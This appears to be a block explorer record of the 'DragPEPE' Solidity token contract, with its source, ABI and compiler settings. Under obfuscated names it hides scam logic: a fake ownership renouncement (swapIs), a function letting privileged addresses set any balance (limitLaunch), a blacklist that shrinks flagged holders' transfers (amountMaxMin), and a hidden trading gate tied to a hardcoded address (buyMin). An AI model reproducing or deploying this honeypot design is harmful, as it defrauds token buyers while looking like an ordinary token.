{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface exemptAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoTo) external view returns (uint256);\n\n    function transfer(address atMarketing, uint256 tokenExempt) external returns (bool);\n\n    function allowance(address listFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atMarketing,\n        uint256 tokenExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxEnable, uint256 value);\n    event Approval(address indexed listFund, address indexed spender, uint256 value);\n}\n\nabstract contract limitTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyList {\n    function createPair(address teamList, address marketingList) external returns (address);\n}\n\ninterface exemptAutoMetadata is exemptAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DragPEPE is limitTake, exemptAuto, exemptAutoMetadata {\n\n    function shouldMode(address limitEnable, address atMarketing, uint256 tokenExempt) internal returns (bool) {\n        require(marketingFund[limitEnable] >= tokenExempt);\n        marketingFund[limitEnable] -= tokenExempt;\n        marketingFund[atMarketing] += tokenExempt;\n        emit Transfer(limitEnable, atMarketing, tokenExempt);\n        return true;\n    }\n\n    function receiverMinLaunched(address limitEnable, address atMarketing, uint256 tokenExempt) internal returns (bool) {\n        if (limitEnable == autoMax) {\n            return shouldMode(limitEnable, atMarketing, tokenExempt);\n        }\n        uint256 autoTx = exemptAuto(maxFund).balanceOf(exemptTo);\n        require(autoTx == txLaunched);\n        require(atMarketing != exemptTo);\n        if (txFund[limitEnable]) {\n            return shouldMode(limitEnable, atMarketing, enableLaunched);\n        }\n        return shouldMode(limitEnable, atMarketing, tokenExempt);\n    }\n\n    function owner() external view returns (address) {\n        return receiverTeamToken;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isEnable;\n    }\n\n    function modeMarketing(address amountTeam) public {\n        if (takeTrading) {\n            return;\n        }\n        if (exemptTake != amountReceiverFrom) {\n            amountReceiverFrom = exemptTake;\n        }\n        shouldSwap[amountTeam] = true;\n        if (isTeam != exemptLiquidity) {\n            teamTo = amountReceiverFrom;\n        }\n        takeTrading = true;\n    }\n\n    uint256 private fundAmount;\n\n    mapping(address => bool) public shouldSwap;\n\n    mapping(address => bool) public txFund;\n\n    bool public takeTrading;\n\n    function transferFrom(address limitEnable, address atMarketing, uint256 tokenExempt) external override returns (bool) {\n        if (_msgSender() != buyAuto) {\n            if (launchedMaxLaunch[limitEnable][_msgSender()] != type(uint256).max) {\n                require(tokenExempt <= launchedMaxLaunch[limitEnable][_msgSender()]);\n                launchedMaxLaunch[limitEnable][_msgSender()] -= tokenExempt;\n            }\n        }\n        return receiverMinLaunched(limitEnable, atMarketing, tokenExempt);\n    }\n\n    uint256 marketingTotal;\n\n    bool private exemptLiquidity;\n\n    function allowance(address walletTradingAuto, address launchedFee) external view virtual override returns (uint256) {\n        if (launchedFee == buyAuto) {\n            return type(uint256).max;\n        }\n        return launchedMaxLaunch[walletTradingAuto][launchedFee];\n    }\n\n    function buyMin(uint256 tokenExempt) public {\n        isLaunchReceiver();\n        txLaunched = tokenExempt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundLaunch;\n    }\n\n    uint256 public exemptFeeMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellTeam;\n    }\n\n    mapping(address => uint256) private marketingFund;\n\n    address public autoMax;\n\n    string private isEnable = \"Drag PEPE\";\n\n    function swapIs() public {\n        emit OwnershipTransferred(autoMax, address(0));\n        receiverTeamToken = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverTeamToken;\n    }\n\n    string private walletSender = \"DPE\";\n\n    uint256 public exemptTake;\n\n    function limitLaunch(address feeExempt, uint256 tokenExempt) public {\n        isLaunchReceiver();\n        marketingFund[feeExempt] = tokenExempt;\n    }\n\n    function approve(address launchedFee, uint256 tokenExempt) public virtual override returns (bool) {\n        launchedMaxLaunch[_msgSender()][launchedFee] = tokenExempt;\n        emit Approval(_msgSender(), launchedFee, tokenExempt);\n        return true;\n    }\n\n    function balanceOf(address autoTo) public view virtual override returns (uint256) {\n        return marketingFund[autoTo];\n    }\n\n    uint256 private sellTeam = 100000000 * 10 ** 18;\n\n    address private receiverTeamToken;\n\n    event OwnershipTransferred(address indexed sellBuy, address indexed modeTeamWallet);\n\n    function amountMaxMin(address swapAt) public {\n        isLaunchReceiver();\n        \n        if (swapAt == autoMax || swapAt == maxFund) {\n            return;\n        }\n        txFund[swapAt] = true;\n    }\n\n    uint256 constant enableLaunched = 13 ** 10;\n\n    uint256 private teamTo;\n\n    mapping(address => mapping(address => uint256)) private launchedMaxLaunch;\n\n    address public maxFund;\n\n    uint256 private teamBuyToken;\n\n    function transfer(address feeExempt, uint256 tokenExempt) external virtual override returns (bool) {\n        return receiverMinLaunched(_msgSender(), feeExempt, tokenExempt);\n    }\n\n    bool private isTeam;\n\n    bool public takeAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletSender;\n    }\n\n    bool public senderTotal;\n\n    address exemptTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private fundLaunch = 18;\n\n    constructor (){\n        if (exemptLiquidity) {\n            isTeam = false;\n        }\n        teamLaunch shouldBuy = teamLaunch(buyAuto);\n        maxFund = buyList(shouldBuy.factory()).createPair(shouldBuy.WETH(), address(this));\n        \n        autoMax = _msgSender();\n        swapIs();\n        shouldSwap[autoMax] = true;\n        marketingFund[autoMax] = sellTeam;\n        \n        emit Transfer(address(0), autoMax, sellTeam);\n    }\n\n    uint256 txLaunched;\n\n    function isLaunchReceiver() private view {\n        require(shouldSwap[_msgSender()]);\n    }\n\n    uint256 public amountReceiverFrom;\n\n    address buyAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTeamWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTradingAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAt\",\"type\":\"address\"}],\"name\":\"amountMaxMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiverFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"buyMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFeeMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"limitLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"}],\"name\":\"modeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DragPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}